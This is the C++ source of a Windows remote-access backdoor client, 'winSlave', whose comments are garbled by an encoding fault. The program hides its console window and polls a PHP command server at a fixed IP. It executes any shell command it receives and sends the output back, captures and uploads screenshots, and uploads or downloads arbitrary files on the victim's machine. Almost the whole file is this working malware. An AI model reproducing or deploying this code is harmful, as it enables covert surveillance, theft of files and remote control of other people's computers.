// winSlave.cpp : �������̨Ӧ�ó������ڵ㡣
//
#include "stdafx.h"

#include "base64.h"  
#include "sendReq.h"
#include "getFile.h"
#include "screenCap.h"

/**
*
*����ͷ�ļ���Ϣ��
*
*base64.cpp/h		base64����
*string base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len)+"\n";
*ע������Java��base64�Դ�\n��β�������������Ա���һ��
*string base64Decode(std::string const& s);
*
*sendReq.h			���ݴ���(������������������������أ��ļ�/��ͼ�ϴ�(�Ƚ���base64)),��ȡ����IP
*CString sendR(const TCHAR * lpHostName, const TCHAR * lpUrl, std::string postData);
*string localIP();
*
*getFile.cpp/h		�ļ�����
*bool getF(string command);
*
*screenCap.cpp/h	����,���ش�С������ָ��(struct bmpMemData),�ǵý�ͼ��delete[]
*bmpMemData scrCap();
*
*
*
*����ָ��ʵ��:
*
*slv-scrcap			����
*
*slv-up-[PATH]		�ܿض��ϴ��ļ�
*
*slv-dwn-[PATH]		�ܿض������ļ�
*
*slv-killself		����ֹͣ
*
*slv-restart		��������
*
**/

#define RSHELL_NULL "0";

//����ָ��ʵ��
const struct COMMANDLIST {
	const std::string screenCapture		=		"slv-scrcap";
	const std::string uploadFile		=		"slv-up-";
	const std::string downloadFile		=		"slv-dwn-";
	const std::string programTerminate	=		"slv-killself";
	const std::string restartProgram	=		"slv-restart";
}COMMANDS;


//����������
#ifdef _DEBUG
std::string URLMAIN = "192.168.0.100";
#elif NDEBUG
std::string URLMAIN = "192.168.0.100";
#endif
std::string URLAPI = "/Rshell/slave_client.php";

//��������Ҫ�������֤
const std::string accessName = "RyuBAI";
const std::string encodeName = base64Encode(reinterpret_cast<const unsigned char*>(accessName.c_str()), accessName.length()) + "\n";

//����Ƶ��(ms)
const int awaitFreq = 15000;	//������û�з���ֵ�������ӣ�
const int activeFreq = 1000;	//�������з���ֵ

//��ȡ��������IP
const std::string localIPAddr = localIP().c_str();



//�������ȴ���������ʱ��POST����
std::string GETCMDparams = "type=WAITSIG&lip=" + localIPAddr + "&access=" + encodeName + "&data=" + RSHELL_NULL;

//������������POST����
std::string SNDRESULTparams = "type=PUSHBAK&lip=" + localIPAddr + "&access=" + encodeName + "&data=";
std::string SNDRESULTparamsCmd = "&cmdline=";

//�ļ������POST����
std::string SNDFILEparams = "type=SNDFILE&lip=" + localIPAddr + "&access=" + encodeName +"&data=\r\n--aabbccRSHELLSNDFILEDATASTART--\r\n";
std::string SNDFILEparamsFILENAMEEND = "\r\n--ddeeffRSHELLSNDFILENAMEEND--\r\n";
std::string SNDFILEparamEND = "\r\n--xxyyzzRSHELLSNDFILEDATAEND--\r\n";

//DEBUG���ܲ��Ժ���
#ifdef _DEBUG
void debugTest();
#endif

//
std::string DATAS;

int main(int argc,char* argv[])
{
#ifdef _DEBUG
	std::cout << "DebugMode ON :)" << std::endl;
	long int beatCal = 0;
	debugTest();
#elif NDEBUG
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif 

	//�������
	int freq = 0;
	

	//���봦��ѭ��
	for (;;) {


		//����������
		Sleep(freq);

#ifdef _DEBUG
		std::cout << "HEARTBEAT num:"<< beatCal++ <<std::endl;
#endif  


		//������������
		DATAS = sendR(URLMAIN,URLAPI,GETCMDparams);
		//�������ݽ�β��\r\n
		if(DATAS.length()>2)DATAS = DATAS.substr(0, DATAS.length() - 2);

		//�����������ӣ������ӿ죬û�����Ӽ�����continue�����������Ĵ������
		if (DATAS != "")freq = activeFreq;
		else { freq = awaitFreq; continue; }


		/**����ָ���**/

		if (DATAS == COMMANDS.programTerminate)	break;
		else if (DATAS == COMMANDS.restartProgram)	{ _popen(argv[0], "r");break;}

		else if (DATAS == COMMANDS.screenCapture) {

			//��ͼ�������������ڴ���
			bmpMemData scr = scrCap();

			//ʱ�����ļ��� 
			std::stringstream stream;
			stream << time(0);
			std::string scrFileName = stream.str();   //�˴�Ҳ������ stream>>string_temp  
			
			//byte��unsigned char,char��signed char�����Բ�ת��ֱ�����ӵ�string�ᱨ���
			std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams +  scrFileName+"_screenshot.bmp"  +SNDFILEparamsFILENAMEEND+ base64Encode(scr.bmpData, scr.length) + SNDFILEparamEND);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << sndResult << std::endl;
#endif

			//�����ˣ���
			delete[] scr.bmpData;

		}
		else if (DATAS.find(COMMANDS.downloadFile)!=-1) {
		
			//��������ת��
			std::string dwnLoc = DATAS;
			std::string l = COMMANDS.downloadFile;

			bool dwnResult = getF(dwnLoc, l);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << dwnLoc << std::endl;
			if (dwnResult == true)std::cout << " download success!" << std::endl;
			else std::cout << " download failed!" << std::endl;
#endif

		
		}
		else if (DATAS.find(COMMANDS.uploadFile) != -1) {

			//��������ת��
			std::string upLoc = DATAS;
			std::string l = COMMANDS.uploadFile;

			string_replace(upLoc, l, "");

			//��ȡ�ļ����ݵ�char* fileTmp

			FILE *pFile = fopen(upLoc.c_str(), "rb"); //��ȡ�ļ���ָ��
			char *pBuf;	//�����ļ�ָ��
			fseek(pFile, 0, SEEK_END); //��ָ���ƶ����ļ��Ľ�β ����ȡ�ļ�����
			int len = ftell(pFile); //��ȡ�ļ�����
			pBuf = new char[len + 1]; //�������鳤��
			rewind(pFile); //��ָ���ƶ����ļ���ͷ ��Ϊ����һ��ʼ��ָ���ƶ�����β��������ƶ����� �����
			fread(pBuf, 1, len, pFile); //���ļ�
			pBuf[len] = 0; //�Ѷ������ļ����һλ дΪ0 Ҫ��Ȼϵͳ��һֱѰ�ҵ�0��Ž���
			fclose(pFile); // �ر��ļ�

			//ʶ���ļ�����std::string fileName
			std::string fileName = upLoc;
			int posi = upLoc.find_last_of("\\");
			fileName = upLoc.substr(posi + 1, upLoc.length());

			std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams + fileName +SNDFILEparamsFILENAMEEND+ base64Encode((unsigned char*)pBuf, sizeof(char) * len) + SNDFILEparamEND);
#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << "fileName: " << fileName << std::endl;
			std::cout << sndResult << std::endl;
#endif
			delete[] pBuf;

		}
		else {
			//cmd����

			std::string shellExec = DATAS;

			FILE *pf = _popen(shellExec.c_str(), "r");

			std::string result;
			char tmp;
			while (fread(&tmp, 1, 1, pf), !feof(pf)) {
				result = result + tmp;

			}
			fclose(pf);

			//���ͷ���ֵ
			std::string sndResult = sendR(URLMAIN, URLAPI, SNDRESULTparams + result + SNDRESULTparamsCmd + shellExec);

#ifdef _DEBUG
			std::cout << "\nCMDLINE: " << DATAS << std::endl;
			std::cout << sndResult << std::endl;
#endif
		}

		
		
		
	}






#ifdef _DEBUG
	std::cout << "\n\nProgram is going to terminate..." << std::endl;
	system("pause");
#endif


    return 0;
}


#ifdef _DEBUG
void debugTest() {
	std::cout << "\nTesting..." << std::endl;
	std::cout << "URLMAIN:"<< URLMAIN << std::endl;
	std::cout << "URLAPI:" << URLAPI <<std::endl << std::endl;
	std::cout << "accessName:" << accessName << std::endl;
	std::cout << "encodeName:" << encodeName << std::endl;
	std::cout << "Local IP Addr:" << localIPAddr << std::endl << std::endl;
	std::cout << "GETCMDparams:" << GETCMDparams<< std::endl;
	std::cout << "SNDRESULTparams:" << SNDRESULTparams << std::endl;


	std::string base64Test = "base64";
	std::cout << "\nTesting base64 with '"<< base64Test <<"'..." << std::endl;
	base64Test = base64Encode(reinterpret_cast<const unsigned char*>(base64Test.c_str()), base64Test.length());
	std::cout << "encode:"<<base64Test << std::endl;
	base64Test = vecCharToChar(base64Decode(base64Test.c_str()));
	std::cout << "decode:"<<base64Test << std::endl << std::endl;

	
	std::cout << "Testing screen capture..." << std::endl;
	bmpMemData scr_tmp = scrCap();
	FILE *scrtmp = fopen("scr.bmp", "w+b");
	fwrite(scr_tmp.bmpData, 1, scr_tmp.length, scrtmp);
	fclose(scrtmp);
	std::cout << "Capture saved in scr.bmp" << std::endl << std::endl;

	std::cout << "Testing download baidu.com/index.html ..." << std::endl;
	std::string lstr = COMMANDS.downloadFile;
	bool dwnResult = getF("slv-dwn-https://www.baidu.com/index.html",lstr);
	if (dwnResult == true)std::cout << "Download success!" << std::endl << std::endl;
	else std::cout << "Download failed!" << std::endl << std::endl;

	std::cout << "Testing upload scr.bmp(Success only if screen capture success) ..." << std::endl;
	std::string sndResult = sendR(URLMAIN, URLAPI, SNDFILEparams + "scr.bmp" +SNDFILEparamsFILENAMEEND+ base64Encode(scr_tmp.bmpData, scr_tmp.length) + SNDFILEparamEND);
	std::cout << "Upload finish!Please check out on Wireshark!" << std::endl;

	std::cout << "Testing base64 encode scr.bmp and save in scr_b64encode.bmp ..." << std::endl;
	std::fstream b64File("scr_b64encode.bmp", std::fstream::out);
	b64File << base64Encode(scr_tmp.bmpData, scr_tmp.length);
	b64File.close();
	std::cout << "Encode finish!Please check out scr_b64encode.bmp" << std::endl;

	std::cout << "Testing cmdline 'dir' ..." << std::endl;
	FILE *pf = _popen("dir", "r");
	std::string result;
	char tmp;
	while (fread(&tmp, 1, 1, pf), !feof(pf)) {
		result = result + tmp;

	}
	std::cout << "Outline:\n" << result << std::endl;
	std::cout << "Cmdline test finish!" << std::endl;


	delete[] scr_tmp.bmpData;//�����ˣ���
	std::cout << "\n\nTest complete!Entering HEARTBEAT loop... \n\n" << std::endl;
}
#endif

